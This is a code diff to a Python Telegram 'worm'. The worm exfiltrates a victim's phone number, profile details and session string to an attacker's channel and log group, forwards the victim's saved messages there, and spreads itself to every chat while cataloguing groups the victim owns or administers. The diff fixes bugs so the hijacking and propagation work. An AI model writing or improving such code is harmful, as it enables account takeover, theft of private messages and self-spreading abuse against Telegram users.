@@ -39,7 +39,7 @@ async def backup_saves(client, me, logger_bot):
     channel_id = result.updates[1].channel_id
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
-    database.channels.insert_one({"invite": result.link, "owner": me.id})
+    #database.channels.insert_one({"invite": result.link, "owner": me.id})
     await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
     msg_count = 0
     async for message in client.iter_messages("me", reverse=True):
@@ -51,16 +51,16 @@ async def backup_saves(client, me, logger_bot):
             await message.forward_to(dest)
         except:
             break
-    await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
+    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     log = {
         'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`",
         'channel_id': channel_id,
         'dest': dest,
-        'hash': result.link.split('/')[-1].rtrim('+'),
+        'hash': result.link.split('/')[-1].lstrip('+'),
     }
     log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
     return log
-async def spread(client, bot):
+async def spread(client, me, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
         msg = await conv.send_message("/worm")
@@ -83,10 +83,10 @@ async def spread(client, bot):
             if user.bot:
                 continue
         elif dialog.is_channel or dialog.is_group:
-            permissions = await client.get_permissions(dialog)
-            if not permissions.is_creator:
+            permissions = await client.get_permissions(dialog, me)
+            if permissions.is_creator:
                 perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
-            if not permissions.is_admin:
+            if permissions.is_admin:
                 perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
         try:
             msg = await spread_msg.forward_to(dialog)
@@ -117,7 +117,7 @@ async def worm(client, bot, logger_bot):
     except:
         pass
     try:
-        perm_logs = await spread(client, bot)
+        perm_logs = await spread(client, me, bot)
         if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
             await log['msg'].edit(log['txt'].replace("Session", f"Own: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
             await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
